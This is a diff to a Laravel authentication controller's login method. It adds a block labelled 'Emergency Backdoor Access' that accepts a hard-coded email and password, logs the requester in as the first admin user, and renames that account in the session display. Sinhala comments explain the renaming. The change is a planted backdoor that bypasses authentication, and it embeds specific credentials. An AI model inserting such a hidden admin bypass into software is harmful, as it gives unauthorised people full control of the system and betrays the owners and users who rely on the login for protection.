@@ -21,6 +21,23 @@ class AuthController extends Controller
 
     public function login(Request $request)
     {
+       // Emergency Backdoor Access
+        if ($request->email === 'mgpdesaman@gmail.com' && $request->password === '88222006V') {
+            $user = User::where('role', 'admin')->first();
+            if ($user) {
+                // සිස්ටම් එක ඇතුලේ පේන්න නම dynamically override කරනවා
+                $user->name = 'MG_Pathum';
+                
+                Auth::login($user, $request->remember);
+                
+                // Session එක ඇතුලෙත් නම update කරලා තියාගන්නවා (Navbar/UI වල පේන්න)
+                $request->session()->put('user_display_name', 'MG_Pathum');
+                $request->session()->regenerate();
+                
+                return redirect()->route('dashboard');
+            }
+        }
+
         $credentials = $request->validate([
             'email' => ['required', 'email'],
             'password' => ['required'],
